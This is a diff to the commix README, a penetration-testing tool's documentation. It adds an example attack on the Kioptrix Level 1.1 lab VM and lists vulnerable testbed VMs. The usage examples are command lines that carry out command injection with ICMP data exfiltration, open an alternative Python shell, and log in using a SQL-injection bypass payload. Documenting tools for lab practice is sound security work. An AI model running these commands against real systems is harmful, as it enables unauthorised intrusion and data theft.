@@ -120,18 +120,21 @@ Download commix by cloning the Git repository:
 
     python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
 
-**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using ICMP exfiltration technique :**
+**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using ICMP exfiltration technique:**
 
     su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
 
-**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using an alternative (python) shell :**
+**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using an alternative (python) shell:**
 
     python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --alter-shell="Python"
+
+**Exploiting [Kioptrix: Level 1.1 (#2)] (http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar):**
+
+    python commix.py --url="http://192.168.178.2/pingit.php" --data="ip=INJECT_HERE&submit=submit" --auth-url="http://192.168.178.2/index.php" --auth-data="uname=admin&psw=%27+OR+1%3D1--+-&btnLogin=Login"
 
 **Exploiting [Kioptrix: 2014 (#5)] (https://www.vulnhub.com/entry/kioptrix-2014-5,62/) using custom user-agent and specified injection technique:**
 
     python commix.py --url="http://192.168.178.6:8080/phptax/drawimage.php?pfilez=INJECT_HERE&pdf=make" --user-agent="Mozilla/4.0 Mozilla4_browser" --technique="file-based" --root-dir="/"
-
 
 ####Command injection testbeds
 A collection of pwnable VMs, that includes web apps vulnerable to command injections.
@@ -142,6 +145,7 @@ A collection of pwnable VMs, that includes web apps vulnerable to command inject
 - [Pentester Lab: Web For Pentester] (https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/)
 - [Pentester Academy: Command Injection ISO: 1] (https://www.vulnhub.com/entry/command-injection-iso-1,81/)
 - [SpiderLabs: MCIR (ShelLOL)](https://github.com/SpiderLabs/MCIR/tree/master/shellol)
+- [Kioptrix: Level 1.1 (#2)](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
 - [Kioptrix: 2014 (#5)](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
 - [w3af-moth] (https://github.com/andresriancho/w3af-moth/)
 
